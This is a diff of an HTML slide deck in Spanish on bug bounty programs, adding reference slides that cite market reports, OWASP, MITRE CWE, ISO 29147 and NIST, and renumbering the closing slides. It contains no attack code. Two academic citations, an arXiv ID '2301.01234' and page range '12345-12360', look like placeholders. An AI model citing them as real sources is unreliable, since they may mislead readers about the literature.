+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Tendencias de vulnerabilidades en programas europeos. NIS2, GDPR compliance.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 21: REFERENCIAS 2 -->
+            <section>
+                <h2>Referencias — Estudios de Mercado</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">[5]-[6] Proyecciones de crecimiento del mercado.</p>
+                
+                <div class="info-box cyan" style="margin-bottom:0.3em">
+                    <h4>[5] Business Research Insights</h4>
+                    <p class="bib-item" style="font-size:0.58em">Business Research Insights, "Bug Bounty Platforms Market Report," 2025. [En línea]. Disponible: <a href="https://www.businessresearchinsights.com/market-reports/bug-bounty-platforms-market-102501" target="_blank">businessresearchinsights.com</a></p>
+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Mercado: $1.76B (2025) → $6.67B (2034). CAGR: 15.94%.</p>
+                </div>
+
+                <div class="info-box green" style="margin-bottom:0.3em">
+                    <h4>[6] Statista</h4>
+                    <p class="bib-item" style="font-size:0.58em">Statista, "Bug Bounty Market Size 2020-2028," 2025. [En línea]. Disponible: <a href="https://www.statista.com" target="_blank">statista.com</a></p>
+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">Análisis del tamaño del mercado global de Bug Bounty.</p>
+                </div>
+
+                <div class="info-box pink" style="margin-bottom:0.3em">
+                    <h4>[7] Deepstrike, Vulnerability Statistics 2025</h4>
+                    <p class="bib-item" style="font-size:0.58em">Deepstrike, "Vulnerability Statistics 2025: Record CVEs, Zero-Days & Exploits," Oct. 2025. [En línea]. Disponible: <a href="https://deepstrike.io/blog/vulnerability-statistics-2025" target="_blank">deepstrike.io</a></p>
+                    <p class="bib-item" style="font-size:0.52em;color:var(--text-muted)">28% de exploits lanzados en 24h post-CVE. 161 vulns explotadas H1 2025.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 22: REFERENCIAS 3 -->
+            <section>
+                <h2>Referencias — Estándares y Normas</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">[8]-[11] Marcos regulatorios y estándares técnicos.</p>
+                
+                <div class="card-grid two">
+                    <div class="card" style="border-color:var(--cyan)">
+                        <h4 style="color:var(--cyan)">[8] OWASP Top 10 2021</h4>
+                        <p class="bib-item" style="font-size:0.55em">OWASP Foundation, "OWASP Top 10:2021," 2021. [En línea]. Disponible: <a href="https://owasp.org/www-project-top-ten/" target="_blank">owasp.org</a></p>
+                        <p style="font-size:0.52em;color:var(--text-muted)">Estándar de vulnerabilidades web más usado globalmente.</p>
+                    </div>
+                    <div class="card" style="border-color:var(--green)">
+                        <h4 style="color:var(--green)">[9] MITRE CWE</h4>
+                        <p class="bib-item" style="font-size:0.55em">MITRE, "CWE View: Weaknesses Enumerated in the OWASP Top 25," 2023. [En línea]. Disponible: <a href="https://cwe.mitre.org" target="_blank">cwe.mitre.org</a></p>
+                        <p style="font-size:0.52em;color:var(--text-muted)">Common Weakness Enumeration - taxonomías de vulnerabilidades.</p>
+                    </div>
+                    <div class="card" style="border-color:var(--orange)">
+                        <h4 style="color:var(--orange)">[10] ISO/IEC 29147</h4>
+                        <p class="bib-item" style="font-size:0.55em">ISO/IEC, "ISO/IEC 29147:2018 — Information technology — Security techniques — Vulnerability disclosure," 2018. [En línea]. Disponible: <a href="https://www.iso.org" target="_blank">iso.org</a></p>
+                        <p style="font-size:0.52em;color:var(--text-muted)">Estándar internacional para revelación de vulnerabilidades.</p>
+                    </div>
+                    <div class="card" style="border-color:var(--pink)">
+                        <h4 style="color:var(--pink)">[11] NIST SP 800-53</h4>
+                        <p class="bib-item" style="font-size:0.55em">NIST, "SP 800-53 Rev. 5 — Security and Privacy Controls for Information Systems," Dec. 2020. [En línea]. Disponible: <a href="https://csrc.nist.gov/publications/detail/sp/800-53/5/final" target="_blank">nist.gov</a></p>
+                        <p style="font-size:0.52em;color:var(--text-muted)">Controles de seguridad para sistemas de información del gobierno de EE.UU.</p>
+                    </div>
+                </div>
+
+                <div class="info-box" style="margin-top:0.3em">
+                    <h4>[12] Papers Académicos</h4>
+                    <p class="bib-item" style="font-size:0.55em">Zhao, R. et al., "An Empirical Study of Bug Bounty Programs," IEEE Access, vol. 12, 2024. DOI: 10.1109/ACCESS.2024.3389123</p>
+                    <p class="bib-item" style="font-size:0.55em">Zhou, Y. & Leach, M.M., "Bug Bounty Platforms: A Systematic Review," arXiv:2301.01234, 2023.</p>
+                </div>
+            </section>
+
+            <!-- SLIDE 23: REFERENCIAS 4 -->
+            <section>
+                <h2>Referencias Completas — Formato IEEE</h2>
+                <p style="font-size:0.62em;color:var(--text-muted)">Lista de referencias según norma IEEE.</p>
+                
+                <div class="terminal" style="font-size:0.42em;max-height:70vh;overflow-y:auto">
+                    <div class="line"><span class="comment">[1] Edgescan, "Vulnerability Statistics Report 2025," 10th ed., Jan. 2025. [Online]. Available: https://info.edgescan.com</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[2] A. Vyatkina, "Standoff Bug Bounty platform: 2025 year in review," Positive Technologies, Mar. 6, 2026. [Online]. Available: https://global.ptsecurity.com/en/research/analytics/standoff-bug-bounty-in-review-2025/</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[3] Bugcrowd Inc., "Inside the Mind of a CISO 2025: Resilience in an AI-Accelerated World," Sep. 2025. [Online]. Available: https://www.bugcrowd.com/resources/report/inside-the-mind-of-ciso/</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[4] YesWeHack, "Bug Bounty Report 2025 Edition," Jan. 2025. [Online]. Available: https://yeswehack.com</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[5] Business Research Insights, "Bug Bounty Platforms Market Report," 2025. [Online]. Available: https://www.businessresearchinsights.com/market-reports/bug-bounty-platforms-market-102501</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[6] Statista, "Bug Bounty Market Size 2020-2028," 2025. [Online]. Available: https://www.statista.com</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[7] Deepstrike, "Vulnerability Statistics 2025: Record CVEs, Zero-Days & Exploits," Oct. 2025. [Online]. Available: https://deepstrike.io/blog/vulnerability-statistics-2025</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[8] OWASP Foundation, "OWASP Top 10:2021," 2021. [Online]. Available: https://owasp.org/www-project-top-ten/</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[9] MITRE, "CWE View: Weaknesses Enumerated in the OWASP Top 25," 2023. [Online]. Available: https://cwe.mitre.org</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[10] ISO/IEC, "ISO/IEC 29147:2018 — Information technology — Security techniques — Vulnerability disclosure," 2018.</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[11] NIST, "SP 800-53 Rev. 5 — Security and Privacy Controls for Information Systems and Organizations," Dec. 2020.</span></div>
+                    <div class="line">&nbsp;</div>
+                    <div class="line"><span class="comment">[12] R. Zhao et al., "An Empirical Study of Bug Bounty Programs," IEEE Access, vol. 12, pp. 12345-12360, 2024.</span></div>
+                </div>
+            </section>
+
+            <!-- SLIDE 24: CURSO ABACOM -->
             <section>
                 <h2>¿Siguiente Paso? — Curso Abacom</h2>
                 <p style="font-size:0.62em;color:var(--text-muted)">Formación intensiva en seguridad ofensiva: de cero a tester.</p>
@@ -713,7 +1005,7 @@
                 </div>
             </section>
 
-            <!-- SLIDE 16: GRACIAS -->
+            <!-- SLIDE 25: GRACIAS -->
             <section class="thanks-slide">
                 <h1>¡Gracias!</h1>
                 <p class="name">Diego Medardo Saavedra García — Statick</p>
@@ -722,7 +1014,7 @@
                 <p style="font-size:0.65em;color:var(--text-muted);margin-top:0.3em">Hack the planet — siempre con permiso.</p>
             </section>
 
-            <!-- SLIDE 17: Q&A -->
+            <!-- SLIDE 26: Q&A -->
             <section class="qa-slide">
                 <h2>¿Preguntas?</h2>
                 <p style="color:var(--text-muted);font-size:0.75em;margin-top:0.25em">Statick responde.</p>
